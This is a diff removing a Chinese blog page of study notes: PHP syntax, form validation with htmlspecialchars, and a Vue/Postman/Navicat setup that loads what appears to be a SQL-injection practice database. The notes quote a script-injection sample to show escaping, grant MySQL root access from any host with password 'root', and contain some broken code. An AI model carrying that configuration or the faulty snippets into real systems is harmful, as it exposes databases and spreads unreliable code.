-<th>名称</th>
-<th>描述</th>
-<th>实例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>x and y</td>
-<td>与</td>
-<td>如果 x 和 y 都为 true，则返回 true</td>
-<td>x&#x3D;6 y&#x3D;3 (x &lt; 10 and y &gt; 1) 返回 true</td>
-</tr>
-<tr>
-<td>x or y</td>
-<td>或</td>
-<td>如果 x 和 y 至少有一个为 true，则返回 true</td>
-<td>x&#x3D;6 y&#x3D;3 (x&#x3D;&#x3D;6 or y&#x3D;&#x3D;5) 返回 true</td>
-</tr>
-<tr>
-<td>x xor y</td>
-<td>异或</td>
-<td>如果 x 和 y 有且仅有一个为 true，则返回 true</td>
-<td>x&#x3D;6 y&#x3D;3 (x&#x3D;&#x3D;6 xor y&#x3D;&#x3D;3) 返回 false</td>
-</tr>
-<tr>
-<td>x &amp;&amp; y</td>
-<td>与</td>
-<td>如果 x 和 y 都为 true，则返回 true</td>
-<td>x&#x3D;6 y&#x3D;3 (x &lt; 10 &amp;&amp; y &gt; 1) 返回 true</td>
-</tr>
-<tr>
-<td>x || y</td>
-<td>或</td>
-<td>如果 x 和 y 至少有一个为 true，则返回 true</td>
-<td>x&#x3D;6 y&#x3D;3 (x&#x3D;&#x3D;5 || y&#x3D;&#x3D;5) 返回 false</td>
-</tr>
-<tr>
-<td>! x</td>
-<td>非</td>
-<td>如果 x 不为 true，则返回 true</td>
-<td>x&#x3D;6 y&#x3D;3 !(x&#x3D;&#x3D;y) 返回 true</td>
-</tr>
-</tbody></table>
-<h3 id="PHP-条件语句"><a href="#PHP-条件语句" class="headerlink" title="PHP 条件语句"></a>PHP 条件语句</h3><ul>
-<li><strong>if 语句</strong> - 在条件成立时执行代码</li>
-<li><strong>if…else 语句</strong> - 在条件成立时执行一块代码，条件不成立时执行另一块代码</li>
-<li><strong>if…elseif….else 语句</strong> - 在若干条件之一成立时执行一个代码块</li>
-<li><strong>switch 语句</strong> - 在若干条件之一成立时执行一个代码块</li>
-</ul>
-<h3 id="PHP-循环"><a href="#PHP-循环" class="headerlink" title="PHP 循环"></a>PHP 循环</h3><ul>
-<li><strong>while</strong> - 只要指定的条件成立，则循环执行代码块</li>
-<li><strong>do…while</strong> - 首先执行一次代码块，然后在指定的条件成立时重复这个循环</li>
-<li><strong>for</strong> - 循环执行代码块指定的次数</li>
-<li><strong>foreach</strong> - 根据数组中每个元素来循环代码块</li>
-</ul>
-<h3 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h3><p>for 循环用于您预先知道脚本需要运行的次数的情况</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">for (初始值; 条件; 增量)</span><br><span class="line">&#123;</span><br><span class="line">    要执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>初始值</strong>：主要是初始化一个变量值，用于设置一个计数器（但可以是任何在循环的开始被执行一次的代码）。</li>
-<li><strong>条件</strong>：循环执行的限制条件。如果为 TRUE，则循环继续。如果为 FALSE，则循环结束。</li>
-<li><strong>增量</strong>：主要用于递增计数器（但可以是任何在循环的结束被执行的代码）。</li>
-</ul>
-<h3 id="foreach-循环"><a href="#foreach-循环" class="headerlink" title="foreach 循环"></a>foreach 循环</h3><p>foreach 循环用于遍历数组</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">foreach ($array as $value)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">foreach ($array as $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。</p>
-<h3 id="PHP-表单验证"><a href="#PHP-表单验证" class="headerlink" title="PHP 表单验证"></a>PHP 表单验证</h3><p>首先对用户所有提交的数据都通过 PHP 的 htmlspecialchars() 函数处理。</p>
-<p>当使用 htmlspecialchars() 函数时，在用户尝试提交以下文本域:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;location.href(&#x27;http://www.runoob.com&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>该代码将不会被执行，因为它会被保存为HTML转义代码，如下所示：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&amp;lt;script&amp;gt;location.href(&#x27;http://www.runoob.com&#x27;)&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure>
-
-<p>以上代码是安全的，可以正常在页面显示或者插入邮件中。</p>
-<p>当用户提交表单时，我们将做以下两件事情：</p>
-<ol>
-<li>使用 PHP trim() 函数去除用户输入数据中不必要的字符 (如：空格，tab，换行)。</li>
-<li>使用PHP stripslashes()函数去除用户输入数据中的反斜杠 ()</li>
-</ol>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/17/php%E5%AD%A6%E4%B9%A0/" data-id="clr4slxwa000aqofn1ec370yo" data-title="php学习" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Vue与postman与navicat安装" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/12/17/Vue%E4%B8%8Epostman%E4%B8%8Enavicat%E5%AE%89%E8%A3%85/" class="article-date">
-  <time class="dt-published" datetime="2023-12-17T11:56:55.000Z" itemprop="datePublished">2023-12-17</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/12/17/Vue%E4%B8%8Epostman%E4%B8%8Enavicat%E5%AE%89%E8%A3%85/">Vue与postman与navicat安装</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Vue与postman与navicat安装"><a href="#Vue与postman与navicat安装" class="headerlink" title="Vue与postman与navicat安装"></a>Vue与postman与navicat安装</h1><h4 id="Vue3安装"><a href="#Vue3安装" class="headerlink" title="Vue3安装"></a>Vue3安装</h4><p>在用 Vue.js 构建大型应用时推荐使用 cnpm 安装，cnpm 能很好地和 Webpack 或 Browserify 模块打包器配合使用，然后在命令行中运行以下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm create vue@latest</span><br></pre></td></tr></table></figure>
-
-<p>这一指令将会安装并执行 create-vue</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312171958377.png" alt="image-20231217195850729"></p>
-<p>如果不确定是否要开启某个功能，你可以直接按下回车键选择 否</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312171959901.png" alt="image-20231208092730169"></p>
-<p>在项目被创建后，通过以下步骤安装依赖并启动开发服务器</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vue-project</span><br><span class="line">npm install</span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172000382.png" alt="image-20231217200043728"></p>
-<p>成功执行以上命令后访问 **<a target="_blank" rel="noopener" href="http://localhost:5173/**%EF%BC%8C%E8%BE%93%E5%87%BA%E7%BB%93%E6%9E%9C%E5%A6%82%E4%B8%8B%E6%89%80%E7%A4%BA%EF%BC%9A">http://localhost:5173/**，输出结果如下所示：</a></p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172001628.png" alt="image-20231208092809222"></p>
-<p>终端输入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">npm install element-plus -save</span><br><span class="line">npm install -D unplugin-vue-components unplugin-auto-import</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172002238.png" alt="image-20231217200201704"></p>
-<p>饿了么网页链接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">https://element-plus.org/zh-CN/guide/design.html</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172003110.png" alt="image-20231217200259387"></p>
-<p>Vue3项目的典型目录结构：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">├── public</span><br><span class="line">│   ├── index.html</span><br><span class="line">│   └── favicon.ico</span><br><span class="line">├── src</span><br><span class="line">│   ├── assets</span><br><span class="line">│   ├── components</span><br><span class="line">│   ├── router</span><br><span class="line">│   ├── store</span><br><span class="line">│   ├── utils</span><br><span class="line">│   ├── views</span><br><span class="line">│   ├── App.vue</span><br><span class="line">│   └── main.ts</span><br><span class="line">├── tests</span><br><span class="line">├── node_modules</span><br><span class="line">├── package.json</span><br><span class="line">├── tsconfig.json</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>&#96;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">- public`：存放静态资源文件，如HTML文件、图片、图标等。</span><br><span class="line">- `src`：存放源代码文件。</span><br><span class="line">  `assets`：存放静态资源文件，如CSS、图片、字体等。</span><br><span class="line">  `components`：存放Vue组件文件。</span><br><span class="line">  `router`：存放Vue Router路由文件。</span><br><span class="line">  `store`：存放Vuex状态管理文件。</span><br><span class="line">  `utils`：存放工具函数文件。</span><br><span class="line">  `views`：存放页面组件文件。</span><br><span class="line">  `App.vue`：根组件文件。</span><br><span class="line">  `main.ts`：入口文件，包括Vue实例的创建和挂载等。</span><br><span class="line">- `tests`：存放测试文件。</span><br><span class="line">- `node_modules`：存放项目依赖的第三方库。</span><br><span class="line">- `package.json`：存放项目的配置信息和依赖库信息。</span><br><span class="line">- `tsconfig.json`：存放TypeScript编译器的配置信息。</span><br><span class="line">- `README.md`：项目说明文件。</span><br></pre></td></tr></table></figure>
-
-<p>打开App.vue根组件文件，删除其基础内容</p>
-<p><img src="/Vue%E4%B8%8Epostman%E4%B8%8Enavicat%E5%AE%89%E8%A3%85.assets/image-20231211092030271.png" alt="image-20231211092030271"></p>
-</li>
-</ul>
-<p>修改main.ts文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import &#x27;./assets/main.css&#x27;</span><br><span class="line"></span><br><span class="line">import &#123; createApp &#125; from &#x27;vue&#x27;</span><br><span class="line">import App from &#x27;./App.vue&#x27;</span><br><span class="line">import ElementPlus from &#x27;element-plus&#x27;;</span><br><span class="line">import &#x27;element-plus/dist/index.css&#x27;</span><br><span class="line"></span><br><span class="line">createApp(App).mount(&#x27;#app&#x27;)</span><br></pre></td></tr></table></figure>
-
-<p>修改vite.con.js文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">mport &#123; fileURLToPath, URL &#125; from &#x27;node:url&#x27;</span><br><span class="line"></span><br><span class="line">import &#123; defineConfig &#125; from &#x27;vite&#x27;</span><br><span class="line">import vue from &#x27;@vitejs/plugin-vue&#x27;</span><br><span class="line">import AutoImport from &#x27;unplugin-auto-import/vite&#x27;</span><br><span class="line">import Components from &#x27;unplugin-vue-components/vite&#x27;</span><br><span class="line">import &#123; ElementPlusResolver &#125; from &#x27;unplugin-vue-components/resolvers&#x27;</span><br><span class="line"></span><br><span class="line">// https://vitejs.dev/config/</span><br><span class="line">export default defineConfig(&#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    vue(),</span><br><span class="line">    // ...</span><br><span class="line">    AutoImport(&#123;</span><br><span class="line">      resolvers: [ElementPlusResolver()],</span><br><span class="line">    &#125;),</span><br><span class="line">    Components(&#123;</span><br><span class="line">      resolvers: [ElementPlusResolver()],</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  resolve: &#123;</span><br><span class="line">    alias: &#123;</span><br><span class="line">      &#x27;@&#x27;: fileURLToPath(new URL(&#x27;./src&#x27;, import.meta.url))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-
-<p>加入蓝色大按钮布局</p>
-<p><img src="/Vue%E4%B8%8Epostman%E4%B8%8Enavicat%E5%AE%89%E8%A3%85.assets/image-20231211095943624.png" alt="image-20231211095943624"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run dev</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172012459.png" alt="image-20231211100043787"></p>
-<p>出现一个蓝色大按钮</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172013367.png" alt="image-20231211100100895"></p>
-<h2 id="postman安装"><a href="#postman安装" class="headerlink" title="postman安装"></a>postman安装</h2><p>官网下载</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">https://www.postman.com/downloads/</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172015156.png" alt="image-20231217201546001"></p>
-<p>注册账户</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172016349.png" alt="image-20231212092200592"></p>
-<p>登录</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172017435.png" alt="image-20231212092228234"></p>
-<p>登录成功</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172018964.png" alt="image-20231217201844629"></p>
-<p>打开虚拟机</p>
-<p>打开phpstudy</p>
-<p>启动apache2.4.39与mysql5.7.26</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172019147.png" alt="image-20231212101006473"></p>
-<p>选择网站，点击管理，选择修改</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172020318.png" alt="image-20231212102042988"></p>
-<p>打开目录索引，点击保存</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172020935.png" alt="image-20231212104644260"></p>
-<p>打开根目录，建立index.php文件</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172021995.png" alt="image-20231212105413790"></p>
-<p>变量与变量，变量与符号用点连接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$a = &quot;aaa&quot;;</span><br><span class="line">$s = &quot;123&quot;;</span><br><span class="line">$b = $a.$s.&quot;bbb&quot;;</span><br><span class="line">echo $b;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>赋值&#x3D;，弱类型匹配&#x3D;&#x3D;，强类型匹配&#x3D;&#x3D;&#x3D;，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$a= &quot;123&quot;;</span><br><span class="line">$b=&quot;111&quot;;</span><br><span class="line">if ($a ==$b)&#123;</span><br><span class="line">echo 1;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo 2;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">header( string $header: &#x27;content-type: text/html; charset=utf-8&#x27;);</span><br></pre></td></tr></table></figure>
-
-<h4 id="navicat"><a href="#navicat" class="headerlink" title="navicat"></a>navicat</h4><p>解压免安装</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172023757.png" alt="image-20231217202306059"></p>
-<p>连接中选择mysql</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172023316.png" alt="image-20231212143333190"></p>
-<p>连接名&#x3D;随便</p>
-<p>主机&#x3D;虚拟机ip</p>
-<p>端口&#x3D;默认</p>
-<p>用户名&#x3D;root</p>
-<p>密码&#x3D;root</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172028540.png"></p>
-<p>打开mysql远程连接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mysql.exe -u root -p</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172024327.png" alt="image-20231212144745776"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">update user set Host=&#x27;%&#x27; where </span><br><span class="line">User=&#x27;root&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172025715.png" alt="image-20231212144804668"></p>
-<p>连接成功</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172026425.png" alt="image-20231217202654925"></p>
-<p>新建查询，复制黏贴，导入四个表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/*</span><br><span class="line"> Navicat Premium Data Transfer</span><br><span class="line"></span><br><span class="line"> Source Server         : 1</span><br><span class="line"> Source Server Type    : MySQL</span><br><span class="line"> Source Server Version : 50741</span><br><span class="line"> Source Host           : localhost:3306</span><br><span class="line"> Source Schema         : security</span><br><span class="line"></span><br><span class="line"> Target Server Type    : MySQL</span><br><span class="line"> Target Server Version : 50741</span><br><span class="line"> File Encoding         : 65001</span><br><span class="line"></span><br><span class="line"> Date: 12/12/2023 15:44:36</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">SET NAMES utf8mb4;</span><br><span class="line">SET FOREIGN_KEY_CHECKS = 0;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for emails</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `emails`;</span><br><span class="line">CREATE TABLE `emails`  (</span><br><span class="line">  `id` int(3) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `email_id` varchar(30) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = InnoDB AUTO_INCREMENT = 9 CHARACTER SET = gbk COLLATE = gbk_chinese_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of emails</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `emails` VALUES (1, &#x27;Dumb@dhakkan.com&#x27;);</span><br><span class="line">INSERT INTO `emails` VALUES (2, &#x27;Angel@iloveu.com&#x27;);</span><br><span class="line">INSERT INTO `emails` VALUES (3, &#x27;Dummy@dhakkan.local&#x27;);</span><br><span class="line">INSERT INTO `emails` VALUES (4, &#x27;secure@dhakkan.local&#x27;);</span><br><span class="line">INSERT INTO `emails` VALUES (5, &#x27;stupid@dhakkan.local&#x27;);</span><br><span class="line">INSERT INTO `emails` VALUES (6, &#x27;superman@dhakkan.local&#x27;);</span><br><span class="line">INSERT INTO `emails` VALUES (7, &#x27;batman@dhakkan.local&#x27;);</span><br><span class="line">INSERT INTO `emails` VALUES (8, &#x27;admin@dhakkan.com&#x27;);</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for referers</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `referers`;</span><br><span class="line">CREATE TABLE `referers`  (</span><br><span class="line">  `id` int(3) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `referer` varchar(256) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  `ip_address` varchar(35) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = gbk COLLATE = gbk_chinese_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for uagents</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `uagents`;</span><br><span class="line">CREATE TABLE `uagents`  (</span><br><span class="line">  `id` int(3) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `uagent` varchar(256) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  `ip_address` varchar(35) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  `username` varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = gbk COLLATE = gbk_chinese_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for users</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `users`;</span><br><span class="line">CREATE TABLE `users`  (</span><br><span class="line">  `id` int(3) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  `password` varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = InnoDB AUTO_INCREMENT = 15 CHARACTER SET = gbk COLLATE = gbk_chinese_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of users</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `users` VALUES (1, &#x27;Dumb&#x27;, &#x27;Dumb&#x27;);</span><br><span class="line">INSERT INTO `users` VALUES (2, &#x27;Angelina&#x27;, &#x27;I-kill-you&#x27;);</span><br><span class="line">INSERT INTO `users` VALUES (3, &#x27;Dummy&#x27;, &#x27;p@ssword&#x27;);</span><br><span class="line">INSERT INTO `users` VALUES (4, &#x27;secure&#x27;, &#x27;crappy&#x27;);</span><br><span class="line">INSERT INTO `users` VALUES (5, &#x27;stupid&#x27;, &#x27;stupidity&#x27;);</span><br><span class="line">INSERT INTO `users` VALUES (6, &#x27;superman&#x27;, &#x27;genious&#x27;);</span><br><span class="line">INSERT INTO `users` VALUES (7, &#x27;batman&#x27;, &#x27;mob!le&#x27;);</span><br><span class="line">INSERT INTO `users` VALUES (8, &#x27;admin&#x27;, &#x27;admin&#x27;);</span><br><span class="line">INSERT INTO `users` VALUES (9, &#x27;admin1&#x27;, &#x27;admin1&#x27;);</span><br><span class="line">INSERT INTO `users` VALUES (10, &#x27;admin2&#x27;, &#x27;admin2&#x27;);</span><br><span class="line">INSERT INTO `users` VALUES (11, &#x27;admin3&#x27;, &#x27;admin3&#x27;);</span><br><span class="line">INSERT INTO `users` VALUES (12, &#x27;dhakkan&#x27;, &#x27;dumbo&#x27;);</span><br><span class="line">INSERT INTO `users` VALUES (14, &#x27;admin4&#x27;, &#x27;admin4&#x27;);</span><br><span class="line"></span><br><span class="line">SET FOREIGN_KEY_CHECKS = 1;</span><br></pre></td></tr></table></figure>
-
-<p>运行</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172031460.png" alt="image-20231217203142954"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/17/Vue%E4%B8%8Epostman%E4%B8%8Enavicat%E5%AE%89%E8%A3%85/" data-id="clr4slxw80005qofn79q1f3q6" data-title="Vue与postman与navicat安装" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-WireShark的使用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/12/17/WireShark%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date">
